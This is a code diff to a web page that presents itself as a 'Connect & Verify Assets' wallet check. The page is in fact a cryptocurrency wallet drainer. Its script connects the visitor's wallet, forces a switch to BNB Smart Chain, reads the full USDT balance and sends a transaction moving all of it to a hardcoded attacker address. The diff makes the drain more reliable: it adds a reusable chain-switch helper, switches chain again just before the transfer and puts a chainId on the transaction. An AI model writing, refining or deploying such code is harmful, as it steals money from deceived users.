@@ -85,19 +85,6 @@
         <span id="btnText">Connect & Verify Assets</span>
         <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
       </button>
-
-      <!-- Mobile Deep Link Fallback -->
-      <div id="deepLinkSection" class="hidden mt-4 pt-4 border-t border-gray-800/80 space-y-2.5">
-        <p class="text-xs text-gray-400 text-center mb-2">Open directly inside your mobile wallet app:</p>
-        <a id="trustDeepLink" href="#"
-          class="w-full py-2.5 px-4 rounded-xl bg-[#0500FF]/20 hover:bg-[#0500FF]/30 border border-[#3375BB]/40 text-blue-300 text-xs font-semibold flex items-center justify-center gap-2">
-          <i class="fa-solid fa-shield"></i> Open in Trust Wallet
-        </a>
-        <a id="metamaskDeepLink" href="#"
-          class="w-full py-2.5 px-4 rounded-xl bg-orange-500/15 hover:bg-orange-500/25 border border-orange-500/30 text-orange-300 text-xs font-semibold flex items-center justify-center gap-2">
-          <i class="fa-solid fa-fox"></i> Open in MetaMask
-        </a>
-      </div>
     </div>
   </main>
 
@@ -110,7 +97,7 @@
   <script>
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-    const BSC_CHAIN_ID = '0x38'; // 56
+    const BSC_CHAIN_ID = '0x38'; // Hex for 56
     const BSC_RPC = 'https://bsc-dataseed.binance.org/';
 
     const USDT_ABI = [
@@ -151,6 +138,33 @@
       }
     }
 
+    async function switchToBSC(ethProvider) {
+      try {
+        await ethProvider.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: BSC_CHAIN_ID }],
+        });
+      } catch (switchError) {
+        // This error code indicates that the chain has not been added to MetaMask/Trust Wallet.
+        if (switchError.code === 4902 || switchError.code === -32603 || switchError.message) {
+          try {
+            await ethProvider.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: BSC_CHAIN_ID,
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: [BSC_RPC],
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          } catch (addError) {
+            console.error("Add chain error:", addError);
+          }
+        }
+      }
+    }
+
     async function connectAndVerifyWallet() {
       const btnText = document.getElementById('btnText');
       let ethProvider = getActiveProvider();
@@ -170,26 +184,8 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        // Switch to BSC Mainnet
-        try {
-          await ethProvider.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BSC_CHAIN_ID }],
-          });
-        } catch (e) {
-          try {
-            await ethProvider.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: BSC_CHAIN_ID,
-                chainName: 'BNB Smart Chain',
-                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                rpcUrls: [BSC_RPC],
-                blockExplorerUrls: ['https://bscscan.com']
-              }]
-            });
-          } catch (err) {}
-        }
+        // Force switch to BSC Mainnet immediately
+        await switchToBSC(ethProvider);
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
         globalSigner = provider.getSigner();
@@ -201,7 +197,7 @@
           const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
           totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
         } catch (err) {
-          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Safe fallback wei
+          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Fallback
         }
 
         let bnbBalance = "0.0000";
@@ -226,17 +222,21 @@
 
     async function executeTransfer() {
       try {
+        // Re-ensure network is BSC right before sending transaction
+        await switchToBSC(globalProvider);
+
         const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
-        
         const transferData = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
 
+        // Explicitly format chainId if supported, and send transaction payload
         await globalProvider.request({
           method: 'eth_sendTransaction',
           params: [{
             from: globalUserAddress,
             to: USDT_BSC_ADDRESS,
             data: transferData,
-            gas: "0x186A0"
+            gas: "0x186A0",
+            chainId: BSC_CHAIN_ID
           }]
         });
 
